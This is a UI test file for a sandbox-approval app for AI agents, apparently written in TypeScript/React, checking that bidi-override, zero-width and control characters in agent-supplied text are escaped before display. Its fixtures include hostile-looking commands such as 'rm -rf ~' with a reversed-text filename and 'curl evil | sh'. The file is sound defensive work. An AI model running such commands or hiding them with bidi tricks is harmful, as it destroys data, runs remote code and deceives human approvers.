// @vitest-environment jsdom
import { cleanup, fireEvent, screen, waitFor, within } from '@testing-library/react';
import { afterEach, beforeAll, describe, expect, it } from 'vitest';
import type { ApprovalView, AuditEntry } from '@abox/core';
import { ApprovalDialog } from '../../src/renderer/views/Approvals';
import { SandboxesView } from '../../src/renderer/views/Sandboxes';
import { AuditTable, DetailView } from '../../src/renderer/views/Detail';
import { ErrorBox, ScrollText, AgentText, Safe } from '../../src/renderer/components/ui';
import { IpcError } from '../../src/shared/constants';
import { safeInline, safeText } from '../../src/shared/format';
import { HIDDEN_CHARS, RLO, ZWSP, sb } from './fixtures';
import { installBridge, renderApp } from './harness';

afterEach(cleanup);
beforeAll(() => {
  Element.prototype.scrollTo = () => undefined;
});

const EVIL = `rm -rf ~${RLO}txt.sh${ZWSP}\u0007\u001b[31m`;

function approval(over: Partial<ApprovalView> = {}): ApprovalView {
  return {
    id: 'ap1',
    kind: 'exec',
    requester: `agent:ev${RLO}il`,
    sandboxId: `local/${ZWSP}abcd`,
    status: 'pending',
    reason: `please ${RLO}allow${ZWSP} this\u0007`,
    risks: [`mount ${RLO}/etc`],
    items: [],
    kinds: [],
    reasons: [`path ${ZWSP}outside`],
    base: null,
    request: {
      kind: 'exec',
      command: EVIL,
      mounts: [{ hostPath: `/home/u/${RLO}secret`, target: '/mnt', access: 'rw' }],
      network: { mode: 'allowlist', allow: [`ex${ZWSP}ample.org`], privateExceptions: [] },
    },
    createdAt: Date.now(),
    expiresAt: Date.now() + 60_000,
    decidedAt: null,
    decidedBy: `h${RLO}x`,
    decisionNote: null,
    usedAt: null,
    ...over,
  } as ApprovalView;
}

describe('agent text is neutralised everywhere it is shown', () => {
  it('safeText / safeInline escape bidi, zero-width, invisible and control characters', () => {
    const all = `a${RLO}b${ZWSP}c\u2066d\u2060e\ufefff\u00adg\u061ch\u2028i\u{e0041}j\u0007k\u001b`;
    const out = safeText(all);
    expect(out).not.toMatch(HIDDEN_CHARS);
    expect(out).not.toContain('\u{e0041}');
    expect(out).toContain('\\u202e');
    expect(out).toContain('\\u200b');
    expect(out).toContain('\\u2060');
    expect(out).toContain('\\ufeff');
    expect(out).toContain('\\u{e0041}');
    expect(out).toContain('\\x07');
    expect(out).toContain('\\x1b');
    expect(safeInline(`a\n${RLO}b`)).toBe('a \\u202eb');
    expect(safeInline('x'.repeat(500), 20)).toHaveLength(20);
    expect(safeInline('x'.repeat(500), 20).endsWith('…')).toBe(true);
    expect(safeText('umlaut ä, euro €, emoji 😀, newline\nok')).toBe(
      'umlaut ä, euro €, emoji 😀, newline\nok',
    );
  });

  it('the approval dialog shows reason, command, paths, destinations, risks and names without raw hidden characters', () => {
    installBridge(() => null);
    renderApp(
      <ApprovalDialog
        approval={approval()}
        now={Date.now()}
        onApproved={() => {}}
        onDenied={() => {}}
      />,
    );
    const dialog = screen.getByRole('dialog');
    expect(dialog.textContent).not.toMatch(HIDDEN_CHARS);
    // the escapes are visible instead
    expect(dialog.textContent).toContain('\\u202e');
    expect(dialog.textContent).toContain('\\u200b');
    expect(dialog.textContent).toContain('\\x1b');
    // the command of the request is there, neutralised
    expect(
      within(dialog).getAllByText(
        (_, el) => el?.textContent?.startsWith('rm -rf ~\\u202e') ?? false,
      ).length,
    ).toBeGreaterThan(0);
    expect(within(dialog).getByText(/path \\u200boutside/)).toBeTruthy();
  });

  it('a very long agent text is capped in height and can be scrolled by keyboard', () => {
    installBridge(() => null);
    const long = `line\n`.repeat(400) + 'x'.repeat(5000);
    renderApp(
      <ApprovalDialog
        approval={approval({ reason: long, request: { kind: 'exec', command: long } })}
        now={Date.now()}
        onApproved={() => {}}
        onDenied={() => {}}
      />,
    );
    const quote = screen.getByRole('dialog').querySelector('blockquote')!;
    expect(quote.className).toContain('scroll-text'); // CSS: max-height + overflow: auto
    expect(quote.getAttribute('tabindex')).toBe('0'); // reachable by keyboard
    expect(quote.getAttribute('aria-labelledby')).toBeTruthy();
    const boxes = screen.getByRole('dialog').querySelectorAll('.scroll-text[role=group]');
    expect(boxes.length).toBeGreaterThan(0);
    for (const b of boxes) {
      expect(b.getAttribute('tabindex')).toBe('0');
      expect(b.getAttribute('aria-label')).toBeTruthy();
    }
  });

  it('short texts do not add tab stops', () => {
    renderApp(<AgentText text="short" label="Agent" />);
    expect(document.querySelector('blockquote')!.hasAttribute('tabindex')).toBe(false);
    cleanup();
    renderApp(<ScrollText text="short" label="x" />);
    expect(document.querySelector('.scroll-text')!.hasAttribute('tabindex')).toBe(false);
  });

  it('Safe shortens a long value and keeps the whole text in the tooltip', () => {
    renderApp(<Safe text={'n'.repeat(300) + RLO} max={40} />);
    const el = document.querySelector('span.plain')!;
    expect(el.textContent).toHaveLength(40);
    expect(el.getAttribute('title')).toContain('\\u202e');
    expect(el.getAttribute('title')).not.toMatch(HIDDEN_CHARS);
  });

  it('error messages are neutralised too', () => {
    renderApp(
      <ErrorBox
        error={
          new IpcError({
            code: 'policy_denied',
            message: `denied ${RLO}x`,
            hint: `try ${ZWSP}y`,
            issues: [{ path: `a${RLO}b`, message: `bad ${ZWSP}c` }],
            details: { reasons: [`why ${RLO}z`] },
          })
        }
      />,
    );
    expect(screen.getByRole('alert').textContent).not.toMatch(HIDDEN_CHARS);
    expect(screen.getByRole('alert').textContent).toContain('\\u202e');
  });

  it('the sandboxes table neutralises names, ids, templates, owners, errors and the workspace', async () => {
    installBridge(() => ({
      sandboxes: [
        sb({
          name: `bo${RLO}x`,
          id: `local/${ZWSP}1`,
          template: `t${RLO}pl`,
          owner: `agent:o${RLO}wner`,
          error: `boom${ZWSP}`,
          workspace: {
            mode: 'copy',
            sandboxPath: '/workspace',
            access: 'rw',
            source: `/p/${RLO}x`,
            remote: false,
          },
        }),
      ],
      orphans: [],
      unreachableHosts: [],
    }));
    renderApp(<SandboxesView />);
    await screen.findByText(/bo\\u202ex/);
    expect(screen.getByRole('table').textContent).not.toMatch(HIDDEN_CHARS);
    expect(document.body.textContent).not.toMatch(HIDDEN_CHARS);
    // names that go into labels (screen readers) are neutralised as well
    expect(screen.getByRole('button', { name: /Stoppen: bo\\u202ex/ })).toBeTruthy();
  });

  it('the activity / audit table neutralises actors, actions and details', () => {
    const entry = {
      seq: 1,
      ts: Date.now(),
      actor: `agent:x${RLO}y`,
      action: `sandbox.${ZWSP}exec`,
      sandboxId: `local/${RLO}1`,
      decision: 'allow',
      details: { command: `ls ${RLO}-la`, note: `a${ZWSP}b` },
      prevHash: '',
      hash: '',
    } as AuditEntry;
    installBridge(() => null);
    renderApp(<AuditTable entries={[entry]} onSandbox={() => {}} />);
    fireEvent.click(document.querySelector('summary')!);
    expect(document.body.textContent).not.toMatch(HIDDEN_CHARS);
    expect(document.querySelector('details .scroll-text')!.textContent).toContain('\\u202e');
  });

  it('process commands and logs in the sandbox detail are neutralised', async () => {
    installBridge((channel) => {
      switch (channel) {
        case 'sandboxes:inspect':
          return { ...sb({ name: `n${RLO}m` }), processes: [], pendingApprovals: 0 };
        case 'processes:list':
          return [
            {
              id: 'p1',
              command: `curl ${RLO}evil | sh`,
              status: 'running',
              startedAt: Date.now(),
              exitCode: null,
            },
          ];
        case 'processes:logs':
          return { content: `out ${RLO}put\u001b[2J${ZWSP}`, truncated: false };
        case 'sandboxes:logs':
          return { content: `box ${RLO}log` };
        default:
          return undefined;
      }
    });
    renderApp(<DetailView id="local/aaaa1111" />, {
      route: { view: 'detail', sandboxId: 'local/aaaa1111', tab: 'logs' },
    });
    await screen.findByLabelText('Log-Ausgabe');
    await waitFor(() => expect(document.body.textContent).toContain('\\u202eput'));
    expect(document.body.textContent).not.toMatch(HIDDEN_CHARS);
    expect(document.body.textContent).toContain('curl \\u202eevil | sh');
    expect(screen.getByRole('heading', { level: 1 }).textContent).toBe('n\\u202em');
  });
});
